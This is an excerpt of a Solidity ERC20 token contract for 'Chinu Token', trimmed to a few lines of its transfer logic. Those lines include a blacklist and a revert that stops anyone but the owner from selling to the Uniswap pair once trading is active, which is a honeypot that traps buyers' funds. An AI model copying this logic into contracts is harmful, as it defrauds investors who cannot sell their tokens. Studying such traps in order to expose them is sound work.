...
/*
    @Chinu Token
    - Website: https://www.chinucoin.io
...
contract CHINU is ERC20, Ownable {
    ...
    constructor() ERC20("Chinu Token", "CHINU") {
    ...
    function _transfer(
        ...
        require(
            !_isBlacklisted[from],
            "Your address has been marked as a sniper, you are unable to transfer or swap."
        );
        ...
        if (tradingActive && to == uniswapV2Pair && from != owner()) {
            revert();
        }
